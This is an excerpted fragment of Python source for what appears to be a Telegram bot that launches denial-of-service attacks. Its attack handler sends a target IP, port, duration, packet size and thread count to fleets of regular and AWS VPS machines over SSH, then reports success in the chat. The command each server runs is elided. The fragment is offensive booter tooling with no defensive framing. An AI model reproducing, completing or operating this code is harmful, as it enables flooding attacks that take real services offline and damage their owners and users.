...
async def attack(update: Update, context: CallbackContext):
    ...
    for vps in available_vps:
        tasks.append(run_ssh_attack(vps, target_ip, port, duration, chat_id, context, "regular", normal_pkt_size["value"], normal_thread["value"]))
    for vps in available_aws_vps:
        tasks.append(run_ssh_attack(vps, target_ip, port, duration, chat_id, context, "aws", aws_pkt_size["value"], aws_thread["value"]))
    ...
    while remaining_time > 0:
        ...
        remaining_time -= 2
        if remaining_time < 0:  # Ensure it doesn’t go negative
            remaining_time = 0
    ...
    # Send success messages after attack completes
    if available_aws_vps:
        await context.bot.send_message(chat_id, "✅ *Attack executed successfully!* (AWS VPS)", parse_mode="Markdown")
    if available_vps:
        await context.bot.send_message(chat_id, "✅ *Attack executed successfully!* (Normal VPS)", parse_mode="Markdown")

# Run SSH attack with custom SSH port
async def run_ssh_attack(vps_data, target_ip, port, duration, chat_id, context, attack_type="regular", pkt_size=1024, thread_count=900):
    async with SSH_SEMAPHORE:
        try:
            ...
            await context.bot.send_message(chat_id, f"❌ *Error executing attack on {vps_data['ip']} ({attack_type}): {str(e)}*", parse_mode="Markdown")
